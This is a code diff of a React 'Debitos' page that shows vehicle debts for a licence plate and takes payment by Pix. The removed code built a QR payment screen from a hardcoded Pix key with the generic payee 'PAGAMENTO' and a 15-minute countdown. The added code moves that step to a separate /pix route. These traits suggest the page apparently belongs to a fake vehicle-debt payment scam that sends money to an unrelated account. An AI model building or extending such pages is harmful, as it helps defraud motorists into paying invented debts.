@@ -1,42 +1,21 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import pixIcon from "@/assets/pix-icon.png";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import heroBg from "@/assets/hero-bg.jpg";
 import { Button } from "@/components/ui/button";
 import { Checkbox } from "@/components/ui/checkbox";
-import { ChevronLeft, AlertTriangle, ChevronDown, ChevronRight, Copy } from "lucide-react";
-import { QRCodeSVG } from "qrcode.react";
-import { useToast } from "@/hooks/use-toast";
+import { ChevronLeft, AlertTriangle, ChevronDown, ChevronRight } from "lucide-react";
 
 const Debitos = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const placa = searchParams.get("placa") || "ABC1D23";
 
-  const { toast } = useToast();
 
   const [showModal, setShowModal] = useState(true);
   const [selectedDebitos, setSelectedDebitos] = useState<string[]>(["1"]);
   const [expandTotal, setExpandTotal] = useState(false);
   const [showPagamento, setShowPagamento] = useState(false);
-  const [showPix, setShowPix] = useState(false);
-  const [countdown, setCountdown] = useState(15 * 60);
-
-  useEffect(() => {
-    if (!showPix) return;
-    const timer = setInterval(() => {
-      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
-    }, 1000);
-    return () => clearInterval(timer);
-  }, [showPix]);
-
-  const formatCountdown = (s: number) => {
-    const m = Math.floor(s / 60).toString().padStart(2, "0");
-    const sec = (s % 60).toString().padStart(2, "0");
-    return `${m}:${sec}`;
-  };
-
-  const pixCodeBase = `00020126580014br.gov.bcb.pix01368f1a2593-382d-4c82-9bd1-cb19348cf4ba520400005303986540`;
 
   const now = new Date();
   const dia = now.toLocaleDateString("pt-BR", { weekday: "long" });
@@ -58,7 +37,7 @@ const Debitos = () => {
     .filter((d) => selectedDebitos.includes(d.id))
     .reduce((sum, d) => sum + d.valor + d.taxas, 0);
 
-  const pixCode = `${pixCodeBase}${total.toFixed(2)}5802BR5909PAGAMENTO6008SAOPAULO62110507${placa}6304`;
+  
 
   const toggleDebito = (id: string) => {
     setSelectedDebitos((prev) =>
@@ -205,13 +184,13 @@ const Debitos = () => {
             </div>
           </div>
         </div>
-      ) : !showPix ? (
+      ) : (
         <div className="max-w-xl mx-auto px-4 mt-8 mb-10">
           <h2 className="text-xl font-bold text-foreground mb-1">Forma de pagamento</h2>
           <p className="text-sm text-muted-foreground mb-6">Selecione abaixo como quer fazer o pagamento</p>
 
           <button
-            onClick={() => setShowPix(true)}
+            onClick={() => navigate(`/pix?placa=${encodeURIComponent(placa)}&valor=${total.toFixed(2)}`)}
             className="w-full flex items-center gap-4 bg-background rounded-xl p-4 shadow-[0_2px_20px_-4px_rgba(0,0,0,0.1)] hover:shadow-md transition-shadow"
           >
             <img src={pixIcon} alt="Pix" className="w-12 h-12 rounded-xl" />
@@ -221,56 +200,6 @@ const Debitos = () => {
             </div>
             <ChevronRight className="w-5 h-5 text-muted-foreground" />
           </button>
-        </div>
-      ) : (
-        <div className="max-w-xl mx-auto px-4 mt-8 mb-10">
-          {/* Resumo do pedido */}
-          <div className="bg-background rounded-xl border border-border p-6 mb-8">
-            <h2 className="text-xl font-bold text-foreground mb-4">Resumo do pedido</h2>
-            <div className="flex justify-between mb-2">
-              <span className="text-sm text-muted-foreground">Placa do veículo</span>
-              <span className="text-sm font-bold text-foreground">{placa}</span>
-            </div>
-            <div className="flex justify-between mb-4">
-              <span className="text-sm text-muted-foreground">Vencimento código Pix</span>
-              <span className="text-sm font-bold text-foreground">{now.toLocaleDateString("pt-BR")}</span>
-            </div>
-            <div className="flex items-center justify-between bg-primary/10 rounded-lg px-4 py-3">
-              <span className="text-sm text-primary-foreground font-medium">Valor do pedido</span>
-              <span className="text-lg font-bold text-foreground">R$ {total.toFixed(2).replace(".", ",")}</span>
-            </div>
-          </div>
-
-          {/* QR Code */}
-          <div className="text-center mb-6">
-            <p className="text-sm text-muted-foreground mb-4">
-              Pague em até: <span className="font-bold text-foreground">{formatCountdown(countdown)}</span>
-            </p>
-            <div className="inline-block bg-background p-4 rounded-xl">
-              <QRCodeSVG value={pixCode} size={180} />
-            </div>
-          </div>
-
-          {/* Código Pix */}
-          <div className="mb-6">
-            <p className="text-sm text-muted-foreground mb-3">
-              Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
-            </p>
-            <div className="bg-background border border-border rounded-lg p-4 break-all text-xs text-foreground font-mono">
-              {pixCode}
-            </div>
-          </div>
-
-          {/* Botão copiar */}
-          <Button
-            onClick={() => {
-              navigator.clipboard.writeText(pixCode);
-              toast({ title: "Código Pix copiado!", description: "Cole no app do seu banco para pagar." });
-            }}
-            className="w-full h-14 bg-foreground text-primary font-bold text-sm rounded-lg hover:bg-foreground/90"
-          >
-            Copiar código Pix
-          </Button>
         </div>
       )}
 
